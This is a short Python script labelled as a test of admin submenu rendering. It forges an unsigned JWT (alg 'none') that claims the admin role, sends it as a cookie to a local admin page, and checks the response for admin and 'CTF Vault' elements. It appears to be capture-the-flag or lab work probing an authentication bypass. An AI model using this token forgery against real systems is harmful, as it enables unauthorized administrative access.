#!/usr/bin/env python3
"""Test admin submenu rendering"""

import json
import base64
import time
import urllib.request

def b64url_encode(data):
    json_str = json.dumps(data)
    return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

def forge_jwt(customer_id="ADMIN001"):
    header = {"typ": "JWT", "alg": "none"}
    payload = {"sub": customer_id, "role": "admin", "iat": int(time.time()), "exp": int(time.time()) + 3600}
    h = b64url_encode(header)
    p = b64url_encode(payload)
    return f"{h}.{p}."

token = forge_jwt("ADMIN001")
url = "http://localhost:9443/admin"

try:
    req = urllib.request.Request(url)
    req.add_header('Cookie', f'access_token={token}')
    
    with urllib.request.urlopen(req) as response:
        html = response.read().decode('utf-8')
        
        # Save to file for inspection
        with open('admin_page.html', 'w') as f:
            f.write(html)
        
        print("[OK] Page saved to admin_page.html")
        
        # Check for specific strings
        print("\nSubstring search results:")
        print(f"  'admin-dashboard': {'YES' if 'admin-dashboard' in html else 'NO'}")
        print(f"  'admin-vault': {'YES' if 'admin-vault' in html else 'NO'}")
        print(f"  'admin-audit': {'YES' if 'admin-audit' in html else 'NO'}")
        print(f"  'CTF Vault': {'YES' if 'CTF Vault' in html else 'NO'}")
        print(f"  'Audit Log': {'YES' if 'Audit Log' in html else 'NO'}")
        
        # Extract nav.item calls to see what's being rendered  
        import re
        admin_refs = re.findall(r"admin-\w+", html)
        print(f"\n  Admin references found: {set(admin_refs)}")
        
except Exception as e:
    print(f"ERROR: {e}")
